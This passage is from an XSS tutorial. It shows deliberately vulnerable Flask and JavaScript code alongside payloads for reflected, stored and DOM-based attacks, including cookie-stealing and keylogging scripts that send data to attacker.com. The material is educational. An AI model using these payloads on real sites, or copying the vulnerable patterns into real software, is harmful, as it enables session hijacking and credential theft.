redirect users to malicious sites</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a3-ba7c-e7b3e00032de" class="bulleted-list"><li style="list-style-type:disc"><strong>Phish users</strong> with fake login forms</li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8030-8df8-fb3f69f59219" class=""><strong>Why XSS is Dangerous</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8055-9f06-c63889ba9e43" class=""><strong>Severity:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803e-9441-de3441e606fa" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>High Impact</strong>: Can lead to complete account compromise</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8084-a560-d3c15c348f1f" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Very Common</strong>: Found in most web applications</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80aa-8237-ec9eedd70b97" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Easy to Exploit</strong>: Simple payloads, widespread impact</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8000-ae16-f98d80290031" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Hard to Detect</strong>: Executes in victim&#x27;s browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a6-9a25-f87e55e681d7" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Widespread</strong>: Affects all applications displaying user input</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8004-99ab-d0907b00938c"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-802a-8286-ec9d39bb9655" class=""><strong>What is XSS</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8086-aa88-e6eb8c9cdfc7" class="">XSS (Cross-Site Scripting) occurs when an application fails to properly encode user-supplied input before including it in HTML output, allowing attackers to inject malicious JavaScript that executes in the victim&#x27;s browser.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8029-8e4e-eed5fa70c80a" class=""><strong>Basic Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a5-a351-fe22092f7176" class=""><strong>Vulnerable Application:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c3-a9af-f695e5514f31" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">@app.route(&#x27;/search&#x27;)
+def search():
+    query = request.args.get(&#x27;q&#x27;)
+    return f&quot;&lt;h1&gt;Results for: {query}&lt;/h1&gt;&quot;  # XSS!
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8028-b140-ea08fb1edde4" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8057-98f5-f8f2541275ed" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: /search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8026-b58d-ce85b424ac32" class=""><strong>Result:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b8-bf39-eaf23cd037f9" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;h1&gt;Results for: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;/h1&gt;
+&lt;!-- Script executes in browser --&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8033-84f0-d6dfa2a3e8e9"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-805b-a150-d518710110df" class=""><strong>Types of XSS Attacks</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c5-b81a-ec2ac32390a3" class=""><strong>1. Reflected XSS (Non-Persistent)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809a-8b84-dd8ec356475f" class=""><strong>Description:</strong> Malicious script is reflected off the web server immediately in response to user input. The payload is not stored.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-bcb3-f5acdd50145e" class=""><strong>Attack Flow:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8063-b10f-f16e4f0a4172" class="numbered-list" start="1"><li>Attacker crafts malicious URL with XSS payload</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8000-80be-e0fd54154316" class="numbered-list" start="2"><li>Attacker sends URL to victim (phishing email, etc.)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8054-bac4-f15b0fd202c6" class="numbered-list" start="3"><li>Victim clicks link</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80d4-98b2-ca07170768ad" class="numbered-list" start="4"><li>Server reflects payload in response</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8047-bf18-ccb8af28d726" class="numbered-list" start="5"><li>Script executes in victim&#x27;s browser</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8033-84cb-d065b71f3398" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80da-83ec-eb0c77bbd6db" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+@app.route(&#x27;/search&#x27;)
+def search():
+    query = request.args.get(&#x27;q&#x27;)
+    return f&quot;&lt;h1&gt;Results for: {query}&lt;/h1&gt;&quot;
+
+# Attack
+# URL: /search?q=&lt;script&gt;document.location=&#x27;http://attacker.com/steal?cookie=&#x27;+document.cookie&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80dd-83c9-d619639f8c4d" class=""><strong>Characteristics:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804c-8106-df7022df2d97" class="bulleted-list"><li style="list-style-type:disc">Payload in URL parameters, headers, or form data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804b-988f-e849c9d5c756" class="bulleted-list"><li style="list-style-type:disc">Not stored on server</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fc-b337-ef73ac617c67" class="bulleted-list"><li style="list-style-type:disc">Requires user interaction (clicking link)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b7-8dca-cdb18615ea05" class="bulleted-list"><li style="list-style-type:disc">Appears to come from legitimate domain</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8033-aa4c-e20340689a70" class="bulleted-list"><li style="list-style-type:disc">Often used in phishing attacks</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8027-b681-fc6efc8d98b6"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8082-baa7-f36a3b6d9099" class=""><strong>2. Stored XSS (Persistent)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8040-beca-eebb16f83342" class=""><strong>Description:</strong> Malicious script is stored on the server (database, file, etc.) and executed whenever the affected page is viewed.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808f-ad5d-c112189e0428" class=""><strong>Attack Flow:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-800e-a3f0-c2b9f28fcaa5" class="numbered-list" start="1"><li>Attacker submits malicious script to application</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8021-ae37-cc5c74b7cc45" class="numbered-list" start="2"><li>Application stores payload (comments, posts, profiles, etc.)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-805f-a762-f36aef6e9fad" class="numbered-list" start="3"><li>Victim views page containing stored payload</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8016-bd35-f266644de3f0" class="numbered-list" start="4"><li>Script executes in victim&#x27;s browser</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8099-a1d8-d99eeb6565d0" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80bd-9d1c-e3e376bfa3d3" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Vulnerable code
+@app.route(&#x27;/comment&#x27;, methods=[&#x27;POST&#x27;])
+def add_comment():
+    comment = request.form[&#x27;comment&#x27;]
+    # Store in database without encoding
+    db.comments.insert({&#x27;comment&#x27;: comment})
+    return &quot;Comment added&quot;
+
+@app.route(&#x27;/comments&#x27;)
+def show_comments():
+    comments = db.comments.find()
+    # Display without encoding - XSS!
+    return render_template(&#x27;comments.html&#x27;, comments=comments)
+
+# Attack
+# Comment: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+# Stored in database, executed for all users viewing comments
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d1-808c-f1439232fe25" class=""><strong>Characteristics:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e3-862b-e16b84462bc8" class="bulleted-list"><li style="list-style-type:disc">Payload stored on server</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8010-a0df-e33966e3ee60" class="bulleted-list"><li style="list-style-type:disc">Affects all users viewing affected content</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80aa-ac73-da48c3c9d116" class="bulleted-list"><li style="list-style-type:disc">No user interaction needed</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d3-bf59-ca29d13eb7c2" class="bulleted-list"><li style="list-style-type:disc">More dangerous than reflected XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809f-b72f-f22adb0c9959" class="bulleted-list"><li style="list-style-type:disc">Harder to detect and remove</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bf-8063-e0852d131c0e"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d9-a1a7-cf88ed9ea05d" class=""><strong>3. DOM-Based XSS</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8011-b1bf-ee0390319e1c" class=""><strong>Description:</strong> Malicious script is executed by manipulating the DOM in the client&#x27;s browser. The vulnerability is in client-side JavaScript, not server-side code.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8003-a2b8-fb55e2239e5f" class=""><strong>Attack Flow:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80b1-8c3d-e377e97f3422" class="numbered-list" start="1"><li>Attacker crafts malicious URL with payload in fragment (#)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-8011-8886-ccceb9a9d247" class="numbered-list" start="2"><li>Client-side JavaScript reads URL parameter/fragment</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-800d-9cee-e42549d754f2" class="numbered-list" start="3"><li>JavaScript unsafely writes to DOM (innerHTML, document.write, etc.)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d5562ad-76f0-80ac-8645-e1346193efad" class="numbered-list" start="4"><li>Script executes in browser</li></ol></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8072-b791-e8badda76a1b" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8048-a74e-d0ed86d425a2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable client-side code
+const urlParams = new URLSearchParams(window.location.search);
+const name = urlParams.get(&#x27;name&#x27;);
+document.getElementById(&#x27;greeting&#x27;).innerHTML = &#x27;Hello &#x27; + name;
+
+// Attack
+// URL: /page?name=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+// innerHTML executes script
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8067-98fb-c39b2299dad7" class=""><strong>Common Vulnerable Functions:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8083-9bbb-f2559d47c9ea" class="bulleted-list"><li style="list-style-type:disc"><code>innerHTML</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80af-9f04-ffe563c9bea9" class="bulleted-list"><li style="list-style-type:disc"><code>outerHTML</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8085-8ee2-d31b338f2a54" class="bulleted-list"><li style="list-style-type:disc"><code>document.write()</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a9-85a9-f2dd1caa03ed" class="bulleted-list"><li style="list-style-type:disc"><code>document.writeln()</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805b-963b-f9f3914062a8" class="bulleted-list"><li style="list-style-type:disc"><code>eval()</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8008-b07e-e444a0012b6b" class="bulleted-list"><li style="list-style-type:disc"><code>setTimeout()</code> / <code>setInterval()</code> with string</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8082-8f75-ea1318702719" class="bulleted-list"><li style="list-style-type:disc"><code>location.href</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c3-86b2-cd17f733f944" class="bulleted-list"><li style="list-style-type:disc"><code>location.search</code></li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8046-b4e0-c173a8c46858" class=""><strong>Characteristics:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c5-85cd-e091c5d29800" class="bulleted-list"><li style="list-style-type:disc">Vulnerability in client-side JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-9995-c1cdc3b5333b" class="bulleted-list"><li style="list-style-type:disc">No server-side reflection needed</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8090-a523-eea620fe4b11" class="bulleted-list"><li style="list-style-type:disc">Payload in URL fragment (#) or query parameters</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806b-8a16-f366a69657ea" class="bulleted-list"><li style="list-style-type:disc">Harder to detect with server-side scanners</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bf-aa86-fac4c52e848b" class="bulleted-list"><li style="list-style-type:disc">Requires client-side testing</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8011-9653-e257039dcd69"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8041-8bdd-c5193fce412e" class=""><strong>How XSS Works</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80fb-a61c-f6f397b12374" class=""><strong>Attack Flow</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a6-a232-d88a3fc55367" class=""><strong>1. Identify Input Point:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809f-94d7-d68d682b51b0" class="bulleted-list"><li style="list-style-type:disc">Find where user input is accepted (forms, URL params, headers, etc.)</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e9-9ef9-da50d35fc4c4" class=""><strong>2. Submit Malicious Payload:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b2-9d03-d9c3c8dae6cf" class="bulleted-list"><li style="list-style-type:disc">Inject JavaScript payload</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8092-8511-ce5cb111f988" class="bulleted-list"><li style="list-style-type:disc">Payload designed to execute in browser context</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d9-be20-c49084110db8" class=""><strong>3. Application Processes Input:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80cd-aed7-fe7186fae739" class="bulleted-list"><li style="list-style-type:disc">Application receives input</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8050-8b9d-cb0dcf42fe3f" class="bulleted-list"><li style="list-style-type:disc">Input included in HTML response without encoding</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a5-9621-e2aa2d9ecb4d" class=""><strong>4. Browser Renders HTML:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8069-be6b-d31ff1b47249" class="bulleted-list"><li style="list-style-type:disc">Browser receives HTML containing payload</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8033-99ac-da995cdbe891" class="bulleted-list"><li style="list-style-type:disc">Browser interprets HTML and executes JavaScript</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a9-8a20-c2dd1c0b0312" class=""><strong>5. Script Executes:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804e-9f4c-f1fd92197f72" class="bulleted-list"><li style="list-style-type:disc">Malicious JavaScript runs in victim&#x27;s browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805d-b2bf-f779829d6185" class="bulleted-list"><li style="list-style-type:disc">Script has access to:<div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80aa-932a-e61edd8ef2d3" class="bulleted-list"><li style="list-style-type:circle">Session cookies (if not HttpOnly)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d3-a996-d5333a694dd8" class="bulleted-list"><li style="list-style-type:circle">DOM</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8063-a69f-db23f3e0b9c7" class="bulleted-list"><li style="list-style-type:circle">LocalStorage/SessionStorage</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8061-b2c8-f38963a41227" class="bulleted-list"><li style="list-style-type:circle">Same-origin requests</li></ul></div></li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8041-9a4e-f531e7251ef8"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-803c-af0c-d81453c55006" class=""><strong>Impact of XSS</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ee-aa08-c494fabbebaf" class=""><strong>1. Session Hijacking</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8098-ab19-c580e5b7b27b" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801f-a876-f803cb845687" class="bulleted-list"><li style="list-style-type:disc">Steal session cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ac-b2db-d1075f5e1227" class="bulleted-list"><li style="list-style-type:disc">Impersonate users</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808c-89f9-c9e5cc47ccce" class="bulleted-list"><li style="list-style-type:disc">Gain unauthorized access</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-8e01-da3fa034831a" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-803c-b665-c703b4812378" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker&#x27;s payload
+&lt;script&gt;
+  fetch(&#x27;http://attacker.com/steal?cookie=&#x27; + document.cookie);
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8068-89d5-fa49726a56b2" class=""><strong>Business Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ef-b494-fbe6090c6507" class="bulleted-list"><li style="list-style-type:disc">Account compromise</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8069-9745-dc994842778b" class="bulleted-list"><li style="list-style-type:disc">Unauthorized access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8016-8cb7-dc6e0879a30d" class="bulleted-list"><li style="list-style-type:disc">Data breach</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8086-a1da-ca85e3b9af5c" class="bulleted-list"><li style="list-style-type:disc">Identity theft</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-805a-97a4-e198245aeff2"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8052-8626-e0daf292f4a9" class=""><strong>2. Defacement</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800d-b3b3-f298235a4d9d" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d8-b019-f7fa25cdf449" class="bulleted-list"><li style="list-style-type:disc">Modify page content</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e0-9b69-d0b5620e5cf2" class="bulleted-list"><li style="list-style-type:disc">Display malicious content</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8041-95da-de1733e48628" class="bulleted-list"><li style="list-style-type:disc">Damage reputation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8001-bde2-eb809734a3a4" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-808f-822f-ff68d6337231" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+  document.body.innerHTML = &#x27;&lt;h1&gt;Hacked!&lt;/h1&gt;&#x27;;
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80cb-8544-f4b1f1cbeb1b"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8013-bb94-e549d2cb550b" class=""><strong>3. Keylogging</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8095-94d1-c473de672f33" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8029-b8e1-f6017d291415" class="bulleted-list"><li style="list-style-type:disc">Capture user keystrokes</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-beaa-dac63cc85591" class="bulleted-list"><li style="list-style-type:disc">Steal credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805d-910a-fe3b8e7cae82" class="bulleted-list"><li style="list-style-type:disc">Monitor user activity</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-8e4a-e2cd658a4cff" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8021-8cfe-c1d64b68396d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+  document.addEventListener(&#x27;keypress&#x27;, function(e) {
+    fetch(&#x27;http://attacker.com/log?key=&#x27; + e.key);
+  });
+&lt;/script&gt;
